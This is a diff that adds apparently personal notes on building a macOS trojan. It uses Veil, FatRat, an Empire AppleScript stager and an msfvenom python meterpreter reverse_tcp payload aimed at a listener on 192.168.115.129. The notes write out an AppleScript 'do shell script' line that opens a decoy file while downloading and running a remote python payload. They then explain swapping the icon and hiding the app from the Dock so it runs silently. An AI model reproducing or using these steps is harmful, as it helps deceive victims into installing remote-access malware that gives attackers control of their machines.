@@ -1,0 +1,48 @@
+Veil - use python payloads and use source.py
+
+FatRat - set option 1
+
+Empire - stager that starts with osx
+
+    usestager osx/applescript
+    set Listener http
+    set OutFile osx_http_12345
+    execute
+
+
+
+msfvenom:
+    msfvenom --list payloads
+
+    looking for python reverse payload -> python/meterpreter/reverse_tcp
+
+    msfvenom --payload python/meterpreter/reverse_tcp lhost=192.168.115.129 lport=1234 > rev_tcp_1234.py
+
+listen for the connection using the msfconsole multi handler
+
+
+
+Convert it to executable (on OSX):
+    ScriptEdit -> File -> Export -> set name -> set fileformat to application
+
+To embadd it to a normal file
+    Download a file (image, pdf,...)
+    $ curl <url> -O -s && open <filename> 
+
+    Now just edit osx_http_12345 contents and paste the abowe line to a file 
+
+
+    Looks like this:
+        do shell script "curl <url> -O -s && open <filename>; echo \"import sys,base6...
+
+Lets make a trojan from this (download and execute)
+    do shell script "cd /tmp/ && curl <url> -O -s && open <filename>; curl <evil_file url> -O -s && python <filename>"
+
+Changing the icon
+    compile and change the icon 
+    download the icon and convert it to icns file
+    use Cocoa Applet to set icon (uncheck "Show startup screen")
+
+
+Lets configure it to run silently
+    RightClick -> Show Package Contents -> Contents -> Open info.plist file -> add a key property inside <dict>, so add: <key>NSUIElement</key> \n <string>1</string>
